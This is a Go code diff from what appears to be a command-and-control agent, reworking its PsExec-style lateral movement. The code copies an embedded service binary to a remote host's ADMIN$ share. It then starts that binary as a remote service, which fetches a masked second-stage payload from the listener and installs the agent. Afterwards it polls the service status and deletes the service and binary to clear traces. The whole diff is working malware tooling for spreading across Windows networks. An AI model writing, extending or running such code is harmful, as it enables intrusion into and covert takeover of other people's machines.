@@ -13,6 +13,7 @@ import (
 	"runtime"
 	"strings"
 	"syscall"
+	"time"
 	"unsafe"
 )
 
@@ -23,6 +24,7 @@ var (
 	procStartServiceW      = advapi32.NewProc("StartServiceW")
 	procDeleteServiceW     = advapi32.NewProc("DeleteServiceW")
 	procCloseServiceHandle = advapi32.NewProc("CloseServiceHandle")
+	procQueryServiceStatus = advapi32.NewProc("QueryServiceStatus")
 )
 
 const (
@@ -62,6 +64,11 @@ func runLateralChild(args []string) error {
 // beacon secret) because a service process inherits no operator
 // environment; build it with the server's use_server_config option.
 func lateralMove(payload lateralPayload) (string, error) {
+	return lateralMoveWithProgress(payload, nil)
+}
+
+// lateralMoveWithProgress publishes acknowledged artifacts before waiting on SCM.
+func lateralMoveWithProgress(payload lateralPayload, publish func(string)) (string, error) {
 	self, err := os.Executable()
 	if err != nil {
 		return "", fmt.Errorf("resolve agent executable: %w", err)
@@ -82,7 +89,7 @@ func lateralMove(payload lateralPayload) (string, error) {
 	agentCommand := lateralAgentCommand(localPath, targetSession, payload.WorkspaceID, serviceName)
 
 	if payload.Method == "psexec" {
-		return lateralPsexecMove(payload, targetSession, serviceName, binaryName)
+		return lateralPsexecMove(payload, targetSession, serviceName, binaryName, publish)
 	}
 
 	// Stage the agent binary through ADMIN$ (SMB write under the active
@@ -106,29 +113,98 @@ func lateralMove(payload lateralPayload) (string, error) {
 		payload.Method, payload.Host, targetSession), nil
 }
 
-// lateralPsexecMove deploys the embedded stage1 launcher the way RemCom and
-// PsExec deploy their service: the compact binary is extracted from this
-// agent's own body, staged on ADMIN$, and started as a demand-start service.
-// stage1 fetches the masked stage2 payload from the listener's staging
-// endpoint, installs the agent, and stops; the cleanup command then removes
-// the service and the launcher binary once the agent is running.
-func lateralPsexecMove(payload lateralPayload, targetSession, serviceName, binaryName string) (string, error) {
-	if !bytes.HasPrefix(embeddedStage1, []byte("MZ")) {
-		return "", errors.New("stage1 launcher is not embedded: build the agent through the server")
+// lateralPsexecMove deploys the dedicated lateral service host the way
+// RemCom and PsExec deploy their service: the compact binary is extracted
+// from this agent's own body, staged on ADMIN$, and started as a
+// demand-start service. Its linked stage1 worker fetches the masked stage2
+// payload from the listener's staging endpoint, installs the agent, and
+// stops. This caller then waits for successful service completion and
+// removes the service and host binary itself; the server cleanup command
+// is only a retry path when this immediate cleanup stays pending.
+func lateralPsexecMove(payload lateralPayload, targetSession, serviceName, binaryName string, publish func(string)) (string, error) {
+	startedAt := time.Now()
+	cfg, err := loadConfig()
+	if err != nil {
+		return "", err
+	}
+	if !bytes.HasPrefix(embeddedLateralService, []byte("MZ")) {
+		return "", errors.New("dedicated lateral service is not embedded: build the agent with MinGW through the server")
 	}
 	sharePath := `\\` + payload.Host + `\ADMIN$\System32\` + binaryName
-	if err := os.WriteFile(sharePath, embeddedStage1, 0700); err != nil {
-		return "", fmt.Errorf("stage launcher on %s: %w", payload.Host, err)
+	if err := os.WriteFile(sharePath, embeddedLateralService, 0700); err != nil {
+		return "", fmt.Errorf("stage lateral service on %s: %w", payload.Host, err)
 	}
 	localPath := `C:\Windows\System32\` + binaryName
-	binPath := fmt.Sprintf(`%s --stage %s --session %s`, localPath, payload.Stage, targetSession)
-	// The service is not marked for deletion here; the cleanup command owns
-	// its removal once the target agent has registered.
+	binPath := fmt.Sprintf(`%s --stage %s --session %s --base-url %s`, localPath, payload.Stage, targetSession, buildWindowsCmdLine([]string{cfg.BaseURL}))
+	// The service is not marked for deletion here; this caller removes it
+	// below once the linked worker has completed successfully.
 	if err := scmStartService(payload.Host, serviceName, binPath, false); err != nil {
 		return "", err
 	}
-	return fmt.Sprintf("lateral started: method=psexec host=%s target session=%s service=%s binary=%s",
-		payload.Host, targetSession, serviceName, binaryName), nil
+	ack := fmt.Sprintf("lateral started: method=psexec host=%s target session=%s service=%s binary=%s",
+		payload.Host, targetSession, serviceName, binaryName)
+	if publish != nil {
+		publish(ack)
+	}
+	if err := waitStage1Stopped(payload.Host, serviceName, time.Duration(payload.TimeoutSeconds*float64(time.Second))-time.Since(startedAt)); err != nil {
+		var failed *launcherFailure
+		if errors.As(err, &failed) {
+			cleanup, cleanupErr := lateralCleanup(lateralCleanupPayload{Host: payload.Host, ServiceName: serviceName, BinaryName: binaryName})
+			if cleanupErr != nil {
+				cleanup = "lateral cleanup pending: " + cleanupErr.Error()
+			}
+			return strings.Replace(ack, "lateral started:", "lateral failed:", 1) + "\n" + err.Error() + "\n" + cleanup, nil
+		}
+		return ack + "\nlateral cleanup pending: " + err.Error(), nil
+	}
+	cleanup, err := lateralCleanup(lateralCleanupPayload{Host: payload.Host, ServiceName: serviceName, BinaryName: binaryName})
+	if err != nil {
+		return ack + "\nlateral cleanup pending: " + err.Error(), nil
+	}
+	return ack + "\n" + cleanup, nil
+}
+
+// waitStage1Stopped observes only this deployment's service, never another agent.
+// A successful service exit means stage1 created the new agent process.
+func waitStage1Stopped(host, name string, timeout time.Duration) error {
+	var machine *uint16
+	if host != "" {
+		pointer, err := syscall.UTF16PtrFromString(`\\` + host)
+		if err != nil {
+			return err
+		}
+		machine = pointer
+	}
+	scm, _, callErr := procOpenSCManagerW.Call(uintptr(unsafe.Pointer(machine)), 0, 1)
+	if scm == 0 {
+		return fmt.Errorf("open SC manager on %s: %w", host, callErr)
+	}
+	defer procCloseServiceHandle.Call(scm)
+	serviceName, err := syscall.UTF16PtrFromString(name)
+	if err != nil {
+		return err
+	}
+	service, _, callErr := procOpenServiceW.Call(scm, uintptr(unsafe.Pointer(serviceName)), 4)
+	if service == 0 {
+		return serviceLookupOutcome(callErr)
+	}
+	defer procCloseServiceHandle.Call(service)
+	deadline := time.Now().Add(timeout)
+	for {
+		var status struct{ serviceType, state, accepted, exitCode, specificCode, checkpoint, waitHint uint32 }
+		ok, _, queryErr := procQueryServiceStatus.Call(service, uintptr(unsafe.Pointer(&status)))
+		if ok == 0 {
+			return fmt.Errorf("query launcher service: %w", queryErr)
+		}
+		ready, err := launcherServiceOutcome(status.state, status.exitCode, status.specificCode)
+		if err != nil || ready {
+			return err
+		}
+		if !time.Now().Before(deadline) {
+			return errors.New("launcher service has not stopped; cleanup pending")
+		}
+		time.Sleep(100 * time.Millisecond)
+	}
 }
 
 // scmStartService creates and starts a service on the target host through
@@ -254,12 +330,19 @@ func runLateralCleanupChild(args []string) error {
 	return nil
 }
 
-// lateralCleanup deletes the temporary launcher service and the stage1
-// binary on the target once the deployed agent is running.
+// lateralCleanup deletes the temporary launcher service and its host
+// binary on the target. It first waits for the linked stage1 worker to
+// finish, so a still-running deployment is never deleted underneath itself.
 func lateralCleanup(payload lateralCleanupPayload) (string, error) {
+	if err := waitStage1Stopped(payload.Host, payload.ServiceName, 15*time.Second); err != nil {
+		var failed *launcherFailure
+		if !errors.As(err, &failed) {
+			return "", err
+		}
+	}
 	serviceDeleted, serviceErr := scmDeleteService(payload.Host, payload.ServiceName)
 	sharePath := `\\` + payload.Host + `\ADMIN$\System32\` + payload.BinaryName
-	fileErr := os.Remove(sharePath)
+	fileErr := removeStoppedLauncher(sharePath)
 	var detail strings.Builder
 	if serviceErr != nil {
 		fmt.Fprintf(&detail, "service error (%v)", serviceErr)
@@ -276,7 +359,24 @@ func lateralCleanup(payload lateralCleanupPayload) (string, error) {
 	default:
 		fmt.Fprintf(&detail, "; launcher binary still on ADMIN$ (%v)", fileErr)
 	}
-	return lateralCleanupOutcome(detail.String(), serviceErr, fileErr)
+	output, err := lateralCleanupOutcome(detail.String(), serviceErr, fileErr)
+	if err == nil {
+		lateralCleanupOwners.Lock()
+		delete(lateralCleanupOwners.artifacts, payload)
+		lateralCleanupOwners.Unlock()
+	}
+	return output, err
+}
+
+// removeStoppedLauncher tolerates the brief image-handle close after SCM stop.
+func removeStoppedLauncher(path string) error {
+	err := os.Remove(path)
+	deadline := time.Now().Add(5 * time.Second)
+	for (errors.Is(err, syscall.Errno(32)) || errors.Is(err, syscall.ERROR_ACCESS_DENIED)) && time.Now().Before(deadline) {
+		time.Sleep(100 * time.Millisecond)
+		err = os.Remove(path)
+	}
+	return err
 }
 
 // lateralPsexecGoroutine runs psexec on a goroutine with a locked OS thread
@@ -289,11 +389,8 @@ func lateralCleanup(payload lateralCleanupPayload) (string, error) {
 // The goroutine's thread impersonation is independent of the main goroutine's
 // thread token; the main goroutine's impersonation state is not affected.
 func lateralPsexecGoroutine(ctx context.Context, payload lateralPayload) (string, error) {
-	type resultT struct {
-		result string
-		err    error
-	}
-	ch := make(chan resultT, 1)
+	ch := make(chan lateralResult, 1)
+	progress := make(chan string, 1)
 	go func() {
 		runtime.LockOSThread()
 		defer func() {
@@ -309,16 +406,14 @@ func lateralPsexecGoroutine(ctx context.Context, payload lateralPayload) (string
 		// the agent's own identity.
 		reestablishThreadToken()
 		if identityBoundaryFault.Load() {
-			ch <- resultT{"", errIdentityUnsafe}
+			ch <- lateralResult{"", errIdentityUnsafe}
 			return
 		}
-		result, err := lateralMove(payload)
-		ch <- resultT{result, err}
+		result, err := lateralMoveWithProgress(payload, func(ack string) {
+			rememberLateralCleanup(payload, ack)
+			progress <- ack
+		})
+		ch <- lateralResult{result, err}
 	}()
-	select {
-	case r := <-ch:
-		return r.result, r.err
-	case <-ctx.Done():
-		return "", errors.New("lateral psexec timed out; the target may still be starting")
-	}
+	return awaitLateralResult(ctx, ch, progress)
 }
